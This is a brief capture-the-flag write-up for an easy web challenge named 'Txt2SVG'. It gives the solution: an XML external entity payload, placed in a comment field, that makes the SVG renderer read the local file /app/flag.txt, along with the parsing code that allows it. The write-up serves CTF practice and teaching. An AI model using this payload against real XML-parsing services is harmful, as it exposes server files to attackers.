# Txt2SVG

Author: reyes

> I made a webapp which can convert your text into a styled svg picture, but for some reason the comments that you can put in aren't in the final result. Why?

**Difficulty: Easy**

## Solution

In the box for text: `&xxe;`  
Any font/size, any dimensions.  
In comment: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>`  

SVG is parsed, external entity called "xxe" is loaded, written into output svg

```py
raw = ET.fromstring(xml)
rendered = ET.tostring(raw)
```
